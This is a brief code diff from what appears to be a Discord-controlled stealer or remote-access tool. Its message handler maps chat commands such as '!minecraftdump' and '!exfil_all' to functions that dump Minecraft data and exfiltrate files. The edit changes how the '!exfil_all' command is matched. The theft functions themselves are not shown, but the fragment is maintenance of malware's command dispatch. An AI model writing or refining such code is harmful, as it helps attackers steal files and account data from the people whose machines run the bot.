@@ -220,7 +220,7 @@ async def on_message(message):
     elif message.content.startswith("!minecraftdump"):
         minecraft_dump()
 
-    elif message.content.startswith("!exfil_all"):
+    elif message.content == "!exfil_all":
         exfiltrate_files()
 
     elif message.content == "!help":
